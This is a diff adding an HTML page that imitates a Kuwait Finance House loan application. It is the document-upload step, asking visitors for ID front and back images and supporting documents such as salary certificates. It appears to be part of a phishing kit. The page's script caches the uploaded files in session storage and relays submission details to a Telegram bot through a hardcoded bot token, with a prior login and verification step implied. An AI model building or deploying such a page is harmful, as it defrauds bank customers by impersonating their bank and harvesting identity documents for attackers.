@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upload Documents - KFH Kuwait</title>
+    <link rel="icon" type="image/png" href="favicon.png" sizes="64x64">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="application.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;500;600;700;800&family=Noto+Kufi+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="description" content="Upload your documents for KFH loan application">
+    
+    <style>
+        :root {
+            --kfh-green: #009144;
+            --kfh-dark-green: #006B35;
+            --kfh-light-green: #E8F5E9;
+            --kfh-gold: #C4A962;
+            --primary-color: #009144;
+            --primary-dark: #006B35;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;">
+                <img src="Kuwait-Finance-House.jpg" alt="KFH" class="logo-img" style="height: 36px; width: auto;">
+                <span class="logo-text">KFH Kuwait</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Application Form -->
+    <section class="application-section">
+        <div class="application-container">
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-step completed" data-step="1">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Login</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step completed" data-step="2">
+                    <div class="step-number">2</div>
+                    <div class="step-label">Verify</div>
+                </div>
+                <div class="progress-line active"></div>
+                <div class="progress-step active" data-step="3">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Documents</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step" data-step="4">
+                    <div class="step-number">4</div>
+                    <div class="step-label">Details</div>
+                </div>
+            </div>
+
+            <!-- Form Card -->
+            <div class="form-card">
+                <!-- Step 3: Document Upload -->
+                <div class="form-step active" id="step-3">
+                    <div class="step-header">
+                        <h2>Upload Your Documents</h2>
+                        <p>Please upload your ID and supporting documents</p>
+                    </div>
+
+                    <div class="document-notice">
+                        <span class="doc-icon">📄</span>
+                        <p>Upload clear photos or scanned copies of your documents</p>
+                    </div>
+
+                    <form id="documents-form" class="loan-form" action="details.html" method="GET">
+                        <!-- ID Document -->
+                        <div class="form-group">
+                            <label for="id-type">ID Type *</label>
+                            <select id="id-type" name="idType" required class="form-input">
+                                <option value="">Select ID type</option>
+                                <option value="civil_id">Civil ID</option>
+                                <option value="passport">Passport</option>
+                                <option value="drivers_license">Driver's License</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="id-front">ID Front Image *</label>
+                            <div class="file-upload-wrapper">
+                                <input type="file" id="id-front" name="idFront" accept="image/*,.pdf" required class="file-input">
+                                <div class="file-upload-label">
+                                    <span class="upload-icon">📷</span>
+                                    <span>Click to upload ID front</span>
+                                    <small>PNG, JPG, PDF (max 10MB)</small>
+                                </div>
+                            </div>
+                            <div id="id-front-preview" class="file-preview" style="display: none;">
+                                <img id="id-front-preview-img" src="" alt="ID Front Preview">
+                                <button type="button" class="remove-file" onclick="removeFile('id-front')">×</button>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="id-back">ID Back Image</label>
+                            <div class="file-upload-wrapper">
+                                <input type="file" id="id-back" name="idBack" accept="image/*,.pdf" class="file-input">
+                                <div class="file-upload-label">
+                                    <span class="upload-icon">📷</span>
+                                    <span>Click to upload ID back</span>
+                                    <small>PNG, JPG, PDF (max 10MB)</small>
+                                </div>
+                            </div>
+                            <div id="id-back-preview" class="file-preview" style="display: none;">
+                                <img id="id-back-preview-img" src="" alt="ID Back Preview">
+                                <button type="button" class="remove-file" onclick="removeFile('id-back')">×</button>
+                            </div>
+                        </div>
+
+                        <!-- Supporting Documents -->
+                        <div class="form-group">
+                            <label for="supporting-doc">Supporting Document (Optional)</label>
+                            <div class="file-upload-wrapper">
+                                <input type="file" id="supporting-doc" name="supportingDoc" accept="image/*,.pdf" class="file-input">
+                                <div class="file-upload-label">
+                                    <span class="upload-icon">📎</span>
+                                    <span>Click to upload supporting document</span>
+                                    <small>Salary certificate, bank statement, etc. (max 10MB)</small>
+                                </div>
+                            </div>
+                            <div id="supporting-doc-preview" class="file-preview" style="display: none;">
+                                <img id="supporting-doc-preview-img" src="" alt="Supporting Doc Preview">
+                                <button type="button" class="remove-file" onclick="removeFile('supporting-doc')">×</button>
+                            </div>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="button" class="btn-secondary" onclick="window.location.href='verify.html'">
+                                ← Back
+                            </button>
+                            <button type="submit" class="btn-primary">
+                                Continue to Details →
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        // File upload preview
+        document.querySelectorAll('.file-input').forEach(input => {
+            input.addEventListener('change', function(e) {
+                const file = e.target.files[0];
+                if (file) {
+                    const previewId = this.id + '-preview';
+                    const previewImgId = this.id + '-preview-img';
+                    const preview = document.getElementById(previewId);
+                    const previewImg = document.getElementById(previewImgId);
+                    
+                    if (file.type.startsWith('image/')) {
+                        const reader = new FileReader();
+                        reader.onload = function(e) {
+                            previewImg.src = e.target.result;
+                            preview.style.display = 'block';
+                        };
+                        reader.readAsDataURL(file);
+                    } else {
+                        // For PDF
+                        previewImg.src = '';
+                        preview.innerHTML = '<div class="pdf-preview">📄 ' + file.name + '</div><button type="button" class="remove-file" onclick="removeFile(\'' + input.id + '\')">×</button>';
+                        preview.style.display = 'block';
+                    }
+                    
+                    // Store file in sessionStorage for bot
+                    const readerForBot = new FileReader();
+                    readerForBot.onload = function(e) {
+                        sessionStorage.setItem(input.id + '_data', e.target.result);
+                        sessionStorage.setItem(input.id + '_name', file.name);
+                        sessionStorage.setItem(input.id + '_type', file.type);
+                    };
+                    readerForBot.readAsDataURL(file);
+                }
+            });
+        });
+
+        function removeFile(inputId) {
+            document.getElementById(inputId).value = '';
+            document.getElementById(inputId + '-preview').style.display = 'none';
+            sessionStorage.removeItem(inputId + '_data');
+            sessionStorage.removeItem(inputId + '_name');
+            sessionStorage.removeItem(inputId + '_type');
+        }
+
+        // Form submission - collect all document data for bot
+        document.getElementById('documents-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Store document info in sessionStorage for bot
+            const formData = new FormData(this);
+            sessionStorage.setItem('idType', formData.get('idType'));
+            sessionStorage.setItem('idFrontName', formData.get('idFront') ? formData.get('idFront').name : '');
+            sessionStorage.setItem('idBackName', formData.get('idBack') ? formData.get('idBack').name : '');
+            sessionStorage.setItem('supportingDocName', formData.get('supportingDoc') ? formData.get('supportingDoc').name : '');
+            
+            // Send to bot
+            sendToBot();
+            
+            // Redirect
+            window.location.href = 'details.html';
+        });
+
+        // Send document data to bot
+        function sendToBot() {
+            const botToken = '7293966729:AAHdqTcvCC9hVU06M5hF0rF6C3Y3bZqT2f0';
+            const chatId = sessionStorage.getItem('user_chat_id');
+            
+            if (!chatId) return;
+
+            let message = '📄 *Document Uploaded*\n\n';
+            message += '*ID Type:* ' + (sessionStorage.getItem('idType') || 'Not provided') + '\n';
+            message += '*ID Front:* ' + (sessionStorage.getItem('idFrontName') || 'Not uploaded') + '\n';
+            message += '*ID Back:* ' + (sessionStorage.getItem('idBackName') || 'Not uploaded') + '\n';
+            message += '*Supporting Doc:* ' + (sessionStorage.getItem('supportingDocName') || 'Not uploaded') + '\n';
+
+            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Bot notification error:', err));
+        }
+
+        // Check if user came from verify
+        if (!sessionStorage.getItem('kfh_verified')) {
+            window.location.href = 'application.html';
+        }
+    </script>
+</body>
+</html>
